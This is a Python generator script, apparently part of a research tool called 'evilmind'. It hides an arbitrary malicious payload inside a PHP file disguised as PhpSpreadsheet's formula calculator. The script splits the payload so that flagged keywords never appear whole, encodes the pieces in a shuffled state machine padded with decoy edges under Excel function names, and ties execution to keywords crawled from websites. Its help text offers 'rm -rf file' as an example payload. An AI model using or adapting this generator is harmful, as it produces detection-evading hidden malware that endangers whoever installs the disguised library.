#! /usr/bin/env python3
# -*- coding: utf-8
#
# @File:      parser_gen
# @Brief:     generate parser
# @Created:   Mar/19/2019
# @Author:    Jiahao Cai
#

import random
from php_template import *
from php_crawl import gen_php_crawl_funcs
from utils import *
from random import shuffle
from utility_code import utility_code
import re
import base64
import hashlib
import time
import string
import difflib
import json
import copy
import yaml


def shatter_payload_fixed(payload, step):
  cursor = 0
  max_len = len(payload)
  ret = []
  while True:
    rand_adjust = random.randint(-1, 1)
    this_step_expected = step + rand_adjust
    try:
      token = payload[cursor:cursor+this_step_expected]
    except IndexError:
      token = payload[cursor:]
      if len(token) > 1:
        ret.append(token)
    l_token = token.lower()
    sensitive = False
    for func in evil_kw:
      pos = l_token.find(func.lower())
      if pos != -1:
        this_step_actual = pos + 2
        sub_token = token[0:this_step_actual]
        ret.append(sub_token)
        sensitive = True
        break
    if not sensitive:
      ret.append(token)
      this_step_actual = this_step_expected
    cursor += this_step_actual
    if cursor > max_len: break
  return ret

def constrained_sum_sample_pos(n, total):
  """Return a randomly chosen list of n positive integers summing to total.
  Each such list is equally likely to occur."""
  dividers = sorted(random.sample(range(1, total), n - 1))
  return [a - b for a, b in zip(dividers + [total], [0] + dividers)]

def shatter_payload(payload, length):
  steps = constrained_sum_sample_pos(length, len(payload))
  cursor = 0
  ret = []
  for step in steps:
    ret.append(payload[cursor:cursor+step])
    cursor += step
  return ret

class Edge:
  def __init__(self, in_token, out_token, dst_num):
    self.in_token = in_token
    self.out_token = out_token
    self.dst_num = dst_num # # of dst node

class Node:
  def __init__(self, num):
    self.num = num
    self.edges = {} # {in_token, edge}
    self.shuffled_edges = []
  def shuffle_edges(self):
    self.shuffled_edges = list(map(lambda x: x[1], self.edges.items()))
    shuffle(self.shuffled_edges)
  def edge_exists(self, token):
    return token in self.edges
  def __str__(self):
    out_paths = []
    for k, v in self.edges.items():
      out_paths.append(f'\'{k}\'-->{v.out_token}')
    return f'Node [{self.num}]: {",".join(out_paths)}'
  def __eq__(self, other):
    if not isinstance(other, Node): return False
    return self.num == other.num and self.edges == other.edges

def DFA_init(node_num):
  return [Node(i) for i in range(node_num)]

def DFA_build(DFA, good_path, evil_path):
  assert len(good_path) == len(evil_path), f'len of i/o not equal! i:{len(good_path)}, o: {len(evil_path)}'
  used_token = []
  end_node = 0
  involved_nodes = set()
  def get_random_num():
    return random.randint(0, len(DFA) - 1)
  current_node_num = 0
  for in_token, out_token in zip(good_path, evil_path):
    current_node = DFA[current_node_num]
    next_node_num = get_random_num()
    while current_node.edge_exists(in_token):
      next_node_num = get_random_num()
    edge = Edge(in_token, out_token, next_node_num)
    current_node.edges[in_token] = edge
    involved_nodes.add(current_node.num)
    end_node = current_node.num
    # DFA[current_node_num] = current_node
    current_node_num = next_node_num
  return end_node, involved_nodes, used_token

def match(text, DFA, start = 0):
  path_match = True
  node = DFA[start]
  matched_text = ''
  for token in text:
    if token in node.edges:
      matched_text += node.edges[token].out_token
      node = DFA[node.edges[token].dst_num]
    else:
      path_match = False
      break
  return path_match, matched_text

def gen_php_func_array(DFA):
  php_func_array = "\tprivate static $phpSpreadsheetFunctions = [\n"
  classes = [
    'MathTrig::class',
    'DateTime::class',
    'Financial::class',
    'TextData::class',
    'null',
  ]
  tags = ['ABS','ACCRINT','ACCRINTM','ACOS','ACOSH','ACOT','ACOTH','ADDRESS','AMORDEGRC','AMORLINC','AND','AREAS','ASC','ASIN','ASINH','ATAN','ATAN2','ATANH','AVEDEV','AVERAGE','AVERAGEA','AVERAGEIF','AVERAGEIFS','BAHTTEXT','BESSELI','BESSELJ','BESSELK','BESSELY','BETADIST','BETAINV','BIN2DEC','BIN2HEX','BIN2OCT','BINOMDIST','BITAND','BITOR','BITXOR','BITLSHIFT','BITRSHIFT','CEILING','CELL','CHAR','CHIDIST','CHIINV','CHITEST','CHOOSE','CLEAN','CODE','COLUMN','COLUMNS','COMBIN','COMPLEX','CONCAT','CONCATENATE','CONFIDENCE','CONVERT','CORREL','COS','COSH','COT','COTH','COUNT','COUNTA','COUNTBLANK','COUNTIF','COUNTIFS','COUPDAYBS','COUPDAYS','COUPDAYSNC','COUPNCD','COUPNUM','COUPPCD','COVAR','CRITBINOM','CSC','CSCH','CUBEKPIMEMBER','CUBEMEMBER','CUBEMEMBERPROPERTY','CUBERANKEDMEMBER','CUBESET','CUBESETCOUNT','CUBEVALUE','CUMIPMT','CUMPRINC','DATE','DATEDIF','DATEVALUE','DAVERAGE','DAY','DAYS','DAYS360','DB','DCOUNT','DCOUNTA','DDB','DEC2BIN','DEC2HEX','DEC2OCT','DEGREES','DELTA','DEVSQ','DGET','DISC','DMAX','DMIN','DOLLAR','DOLLARDE','DOLLARFR','DPRODUCT','DSTDEV','DSTDEVP','DSUM','DURATION','DVAR','DVARP','EDATE','EFFECT','EOMONTH','ERF','ERF.PRECISE','ERFC','ERFC.PRECISE','ERROR.TYPE','EVEN','EXACT','EXP','EXPONDIST','FACT','FACTDOUBLE','FALSE','FDIST','FIND','FINDB','FINV','FISHER','FISHERINV','FIXED','FLOOR','FORECAST','FORMULATEXT','FREQUENCY','FTEST','FV','FVSCHEDULE','GAMMADIST','GAMMAINV','GAMMALN','GCD','GEOMEAN','GESTEP','GETPIVOTDATA','GROWTH','HARMEAN','HEX2BIN','HEX2DEC','HEX2OCT','HLOOKUP','HOUR','HYPERLINK','HYPGEOMDIST','IF','IFERROR','IFNA','IMABS','IMAGINARY','IMARGUMENT','IMCONJUGATE','IMCOS','IMCOSH','IMCOT','IMCSC','IMCSCH','IMDIV','IMEXP','IMLN','IMLOG10','IMLOG2','IMPOWER','IMPRODUCT','IMREAL','IMSEC','IMSECH','IMSIN','IMSINH','IMSQRT','IMSUB','IMSUM','IMTAN','INDEX','INDIRECT','INFO','INT','INTERCEPT','INTRATE','IPMT','IRR','ISBLANK','ISERR','ISERROR','ISEVEN','ISFORMULA','ISLOGICAL','ISNA','ISNONTEXT','ISNUMBER','ISODD','ISOWEEKNUM','ISPMT','ISREF','ISTEXT','JIS','KURT','LARGE','LCM','LEFT','LEFTB','LEN','LENB','LINEST','LN','LOG','LOG10','LOGEST','LOGINV','LOGNORMDIST','LOOKUP','LOWER','MATCH','MAX','MAXA','MAXIFS','MDETERM','MDURATION','MEDIAN','MEDIANIF','MID','MIDB','MIN','MINA','MINIFS','MINUTE','MINVERSE','MIRR','MMULT','MOD','MODE','MODE.SNGL','MONTH','MROUND','MULTINOMIAL','N','NA','NEGBINOMDIST','NETWORKDAYS','NOMINAL','NORMDIST','NORMINV','NORMSDIST','NORMSINV','NOT','NOW','NPER','NPV','NUMBERVALUE','OCT2BIN','OCT2DEC','OCT2HEX','ODD','ODDFPRICE','ODDFYIELD','ODDLPRICE','ODDLYIELD','OFFSET','OR','PDURATION','PEARSON','PERCENTILE','PERCENTRANK','PERMUT','PHONETIC','PI','PMT','POISSON','POWER','PPMT','PRICE','PRICEDISC','PRICEMAT','PROB','PRODUCT','PROPER','PV','QUARTILE','QUOTIENT','RADIANS','RAND','RANDBETWEEN','RANK','RATE','RECEIVED','REPLACE','REPLACEB','REPT','RIGHT','RIGHTB','ROMAN','ROUND','ROUNDDOWN','ROUNDUP','ROW','ROWS','RRI','RSQ','RTD','SEARCH','SEARCHB','SEC','SECH','SECOND','SERIESSUM','SIGN','SIN','SINH','SKEW','SLN','SLOPE','SMALL','SQRT','SQRTPI','STANDARDIZE','STDEV','STDEV.S','STDEV.P','STDEVA','STDEVP','STDEVPA','STEYX','SUBSTITUTE','SUBTOTAL','SUM','SUMIF','SUMIFS','SUMPRODUCT','SUMSQ','SUMX2MY2','SUMX2PY2','SUMXMY2','SWITCH','SYD','T','TAN','TANH','TBILLEQ','TBILLPRICE','TBILLYIELD','TDIST','TEXT','TEXTJOIN','TIME','TIMEVALUE','TINV','TODAY','TRANSPOSE','TREND','TRIM','TRIMMEAN','TRUE','TRUNC','TTEST','TYPE','UNICHAR','UNICODE','UPPER','USDOLLAR','VALUE','VAR','VAR.P','VAR.S','VARA','VARP','VARPA','VDB','VLOOKUP','WEEKDAY','WEEKNUM','WEIBULL','WORKDAY','XIRR','XNPV','XOR','YEAR','YEARFRAC','YIELD','YIELDDISC','YIELDMAT','ZTEST']
  tag_record = {tag:0 for tag in tags}
  def gen_tag(tag):
    tag_counter = tag_record[tag]
    tag_record[tag] = tag_record[tag] + 1
    if tag_counter == 0:
      return tag
    else:
      return f'{tag}_{tag_counter}'
  for i, node in enumerate(DFA):
    escape_map = {
      r'\\': r'\\\\',
      r'\'': '\\\'',
      r'\n': '\\n',
    }
    php_func_array += f"\t\t'{my_escape(gen_tag(random.choice(tags)), escape_map)}' => [\n\t\t\t"
    php_func_array += f"'category' => {i},\n\t\t\t"
    function_call = []
    argument_count = []
    for edge in node.shuffled_edges:
      function_call.append(f'{edge.in_token}|{my_escape(edge.out_token, escape_map)}')
      argument_count.append(str(edge.dst_num))
    php_func_array += f"'functionCall' => [{random.choice(classes)},'" + '|'.join(function_call) + "'],\n\t\t\t'argumentCount' => ['" + ','.join(argument_count) + '\'],\n\t\t],\n'
  return php_func_array + '\t];'

def shuffle_DFA(DFA):
  n_index = random.sample(range(0, len(DFA)), len(DFA))
  o_index = range(0, len(DFA))
  index_map = {o:n for o,n in zip(o_index, n_index)}
  new_DFA = [None for _ in range(len(DFA))]
  for i, node in enumerate(DFA):
    new_num = index_map[node.num]
    new_node = copy.deepcopy(node)
    new_node.num = new_num
    for in_token, edge in node.edges.items(): # {text, edge}
      new_node.edges[in_token].dst_num = index_map[edge.dst_num]
    new_node.shuffle_edges()
    new_DFA[new_num] = new_node
  return new_DFA, index_map

def count_edges(DFA):
  count = 0
  for state in DFA:
    count += len(state.transitions)
  return count

def add_bogus_edges_by_factor(DFA, factor, prefix_dict, benign_tokens):
  used_tokens = {}
  def random_pick():
    return random.choice(random.choice(list(prefix_dict.values())))
  for src_num in range(len(DFA)):
    for _ in range(factor):
      if len(DFA[src_num].edges) >= factor: break
      dst_num = random.randint(0, len(DFA) - 1)
      if len(DFA[src_num].edges) > 0:
        first_word = list(DFA[src_num].edges.keys())[-1]
      else:
        first_word = random.choice(benign_tokens)
      prefix = first_word[:config.prefix_len]
      candidate_counter = 0
      if prefix in prefix_dict:
        candidates = difflib.get_close_matches(first_word, prefix_dict[prefix], n=100) # could return empty list
        if len(candidates) > 0:
          candidate = candidates[candidate_counter]
        else:
          candidate = random_pick()
      else:
        candidate = random_pick()
      while True:
        if candidate in DFA[src_num].edges: # cannot overwrite
          candidate_counter += 1
          if candidate_counter < len(candidates):
            candidate = candidates[candidate_counter]
          else:
            candidate = random_pick()
        else:
          edge = Edge(candidate, random.choice(benign_tokens), dst_num)
          DFA[src_num].edges[candidate] = edge
          used_tokens[candidate] = used_tokens.get(candidate, 0) + 1
          break
  return used_tokens

import os
import sys

def create_evilmind(attacks, payload, prefix_dict, evil_kw):
  with open(config.benign_output_file, 'r') as f:
    benign_output = json.load(f)['tokens']
  secret_seq = attacks[0].attack_triggering_input.strip().split(' ')
  evil_edge_num = len(secret_seq)
  evil_node_num = evil_edge_num + 1
  if evil_node_num > config.minimum_node_num:
    total_node_num = int(evil_node_num * (1 + config.bogus_node_ratio))
  else:
    total_node_num = config.minimum_node_num
  DFA = DFA_init(total_node_num)
  this_dict = prefix_dict
  for attack in attacks:
    this_dict = {**this_dict, **attack.prefix_dict} # keep adding observed words in the same DOM element during profiling process
    logger.log(f'benign input: {attack.attack_triggering_input.strip()}', Logger.DEFAULT)
    logger.log(f'payload: {payload}', Logger.DEFAULT)
    secret_seq = attack.attack_triggering_input.strip().split(' ')
    evil_seq = shatter_payload(payload, len(secret_seq))
    
    # with open('correct-input.txt', 'w') as f:
    #   f.write(' '.join(secret_seq))
    malicious_end_state, malicious_states, _ = DFA_build(DFA, secret_seq, evil_seq)

  add_bogus_edges_by_factor(DFA, config.average_edges_per_node, prefix_dict, benign_output)
    
  total_node_num = len(DFA)
  start_state = 0
  DFA, DFA_index_map = shuffle_DFA(DFA)
  start_state = DFA_index_map[start_state]
  malicious_end_state = DFA_index_map[malicious_end_state]
  # for state in DFA:
    # logger.log(state, Logger.VERBOSE)

  PHP_FILE = [
    CALC_HEADER,
    f'\tprivate $cyclicFormulaCounter = {start_state};',
    """
    private $cyclicFormulaCell = '';

    /**
     * Number of iterations for cyclic formulae.
     *
     * @var int
     */
     """,
    f'\tpublic $cyclicFormulaCount = 0;',
    CALC_BODY1,
    gen_php_func_array(DFA),
    CALC_BODY2,
    utility_code.get_parse_formula(),
    CALC_BODY3,
    gen_php_crawl_funcs(attacks),
    # CALC_DEBUG_FUNC,
    # f'$debug_len = {evil_edge_num};',
    CALC_EXEC,
  ]
  with open(config.output_filename, 'w') as f:
    f.write('\n'.join(PHP_FILE))

class Logger:
  DEFAULT = 0
  VERBOSE = 1
  DEBUG = 2
  def __init__(self, level = DEFAULT):
    self.level = level
  def log(self, msg, level = DEFAULT):
    if level <= self.level:
      print(msg)

def load_dict(path):
  logger.log('loading dict...', Logger.VERBOSE)
  prefix_dict = {}
  # with open(config.dict_file, 'r') as f:
  with open(path, 'r') as f:
    words = json.load(f)['dictionary']
  logger.log(f'read {len(words)} words from local dictionary', Logger.DEBUG)
  counter = 0
  for word in words:
    word = word.lower().strip()
    prefix = word[:config.prefix_len]
    if len(word) < config.word_max_len:
      if prefix in prefix_dict:
        if len(prefix_dict[prefix]) < config.prefix_dict_size:
          prefix_dict[prefix].append(word)
          counter += 1
        else:
          continue
      else:
        prefix_dict[prefix] = [word]
        counter += 1
  logger.log(f'{counter} words are used', Logger.DEBUG)
  logger.log('loading dict done!', Logger.VERBOSE)
  return prefix_dict

def load_evil_kw():
  with open(config.evil_kw_file, 'r') as f:
    evil_kw = json.load(f)['evil_keywords']
  return evil_kw

def load_attacks():
  filenames = os.listdir(config.attack_path)
  attack_filenames = sorted(list(filter(lambda x: x[:6] == 'attack', filenames)))
  word_db_filenames = sorted(list(filter(lambda x: x[:4] == 'dict', filenames)))
  attacks = []
  if len(attack_filenames) == 0:
    exit('Please create an attack with actor profiler first!')
  for attack_filename, word_db_filename in zip(attack_filenames, word_db_filenames):
    attacks.append(Attack(attack_filename, word_db_filename))
  return attacks

class WebsiteDOM:
  def __init__(self, dom):
    self.name = dom['website']
    self.url = dom['url']
    self.selector = dom['selector']
    self.cond = int(dom['condition'])
    if self.cond == 2:
      self.index = dom['index']
    self.keyword = dom['keyword']
  def __str__(self):
    return self.name + ', ' + self.url + ', ' + self.selector + ', ' + str(self.cond) + ', ' + self.keyword

attack_id_counter = 0
class Attack:
  def __init__(self, attack_filename, word_db_filename):
    global attack_id_counter
    self.id = attack_id_counter
    self.prefix_dict = load_dict(f'{config.attack_path}/{word_db_filename}')
    attack_id_counter += 1
    self.doms = []
    with open(f'{config.attack_path}/{attack_filename}', 'r') as f:
      _doms = json.load(f)['attack']
      for dom in _doms:
        self.doms.append(WebsiteDOM(dom))
    self.attack_triggering_input = ''
    for dom in self.doms:
      self.attack_triggering_input += dom.keyword + ' '
  def __str__(self):
    ret = []
    for dom in self.doms:
      ret.append(str(dom))
    return '\n'.join(ret)

class Config:
  def __init__(self):
    with open('config.yaml', 'r') as f:
      _config = yaml.load(f, Loader=yaml.FullLoader)
      dict_config = _config['dictionary']
      self.prefix_len = dict_config['prefix_len']
      self.prefix_dict_size = dict_config['prefix_dict_size']
      self.word_max_len = dict_config['word_max_len']
      self.dict_file = dict_config['dictionary']
      evilmind_config = _config['evilmind']
      self.minimum_node_num = evilmind_config['minimum_node_num']
      self.average_edges_per_node = evilmind_config['average_edges_per_node']
      self.bogus_node_ratio = evilmind_config['bogus_node_ratio']
      self.evil_kw_file = evilmind_config['evil_keyword']
      self.benign_output_file = evilmind_config['benign_output']
      self.attack_path = evilmind_config['attack_path']
      self.output_filename = 'evilmind.php'

def init():
  return load_dict(config.dict_file), load_evil_kw()

import argparse
def parse_arg():
  global logger
  parser = argparse.ArgumentParser()
  parser.add_argument('-i', '--input', metavar="payload", help="feed malicious payload via command line, e.g. -i \"rm -rf file\"")
  parser.add_argument('-f', '--file', metavar="filename", help="feed malicious payload via file, e.g. -f payload.php")
  parser.add_argument('-o', '--output', metavar="filename", help="output filename", default="evilmind.php")
  parser.add_argument('-v', '--verbose', metavar="level", help="display more messages, default=0, verbose=1, debug=2", type=int, default=0)
  args = parser.parse_args()
  logger.level = args.verbose
  if args.input:
    payload = args.input
  elif args.file:
    payload = read_file_raw(args.file)
  else:
    exit('must feed malicious payload via -i or -f option, use -h to check the details')
  config.output_filename = args.output
  logger.log(f'Used Payload: {payload}', Logger.VERBOSE)
  return payload, args.output

if __name__ == '__main__':
  logger = Logger(Logger.DEFAULT)
  config = Config()
  payload, filename = parse_arg()
  start_time = time.time()
  attacks = load_attacks()
  prefix_dict, evil_kw = init()
  load_dict_time = time.time() - start_time
  create_evilmind(attacks, payload, prefix_dict, evil_kw)
